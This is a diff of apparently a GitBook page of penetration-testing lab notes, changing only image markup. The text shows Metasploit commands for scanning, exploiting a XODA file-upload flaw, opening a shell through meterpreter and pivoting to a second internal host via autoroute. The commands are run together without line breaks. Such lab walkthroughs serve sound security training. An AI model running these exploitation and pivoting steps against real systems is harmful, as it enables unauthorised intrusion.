@@ -20,11 +20,15 @@ service postgresql startmsfconsole
 
 * Inside `msfconsole`
 
-db\_statusworkspace -a Win2k12db\_import /root/windows\_server\_2012\[\*] Importing 'Nmap XML' data\[\*] Import: Parsing with 'Nokogiri v1.10.7'\[\*] Importing host 10.2.18.161\[\*] Successfully imported /root/windows\_server\_2012hostsservicesvulnslootcredsnotes![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ba67b9abca052938ff18e17b7f35afdab9badf6f%2Fimage-20230412190333138.png?alt=media)
+db\_statusworkspace -a Win2k12db\_import /root/windows\_server\_2012\[\*] Importing 'Nmap XML' data\[\*] Import: Parsing with 'Nokogiri v1.10.7'\[\*] Importing host 10.2.18.161\[\*] Successfully imported /root/windows\_server\_2012hostsservicesvulnslootcredsnotes
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ba67b9abca052938ff18e17b7f35afdab9badf6f%2Fimage-20230412190333138.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 * Perform an `nmap` scan _within the MSF Console and import the results in a dedicated workspace_
 
-workspace -a nmap\_MSFdb\_nmap -Pn -sV -O \<TARGET\_IP>![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-90d3514d0aea7cc72d1451e9439952f4b724e2d5%2Fimage-20230412190726940.png?alt=media)
+workspace -a nmap\_MSFdb\_nmap -Pn -sV -O \<TARGET\_IP>
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-90d3514d0aea7cc72d1451e9439952f4b724e2d5%2Fimage-20230412190726940.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 #### ​[Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/)​ <a href="#port-scanning" id="port-scanning"></a>
 
@@ -38,11 +42,15 @@ MSF **Auxiliary modules** are used during the information gathering (similar to 
 
 > 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)​
 
-service postgresql start && msfconsole -qworkspace -a Port\_scansearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.41.167.3run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f9bb00e236dcbcacb2dd85e5f4f8181ca1810f97%2Fimage-20230412220747788.png?alt=media)curl 192.41.167.3
+service postgresql start && msfconsole -qworkspace -a Port\_scansearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.41.167.3runcurl 192.41.167.3
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f9bb00e236dcbcacb2dd85e5f4f8181ca1810f97%2Fimage-20230412220747788.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 * Exploitation
 
-search xodause exploit/unix/webapp/xoda\_file\_uploadset RHOSTS 192.41.167.3set TARGETURI /run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-be8eaadffd478211a6c3c787bbd54c2ffb0dd4e4%2Fimage-20230412221111369.png?alt=media)
+search xodause exploit/unix/webapp/xoda\_file\_uploadset RHOSTS 192.41.167.3set TARGETURI /run
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-be8eaadffd478211a6c3c787bbd54c2ffb0dd4e4%2Fimage-20230412221111369.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 * Perform a network scan on the second target
 
@@ -50,7 +58,9 @@ meterpreter > shell/bin/bash -iifconfig# 192.26.158.2 Local Lan subnet IPexit
 
 * Add the route within `meterpreter` and background the meterpreter session
 
-run autoroute -s 192.26.158.2background![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-67e7adb134ca47fb1df4ff6f49abb7370d8802a9%2Fimage-20230412221528898.png?alt=media)search portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.26.158.3run# the port scan will be performed through the first target system using the route\[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN
+run autoroute -s 192.26.158.2backgroundsearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.26.158.3run# the port scan will be performed through the first target system using the route\[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-67e7adb134ca47fb1df4ff6f49abb7370d8802a9%2Fimage-20230412221528898.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 * Upload and run `nmap` against the second target, from the first target machine
 
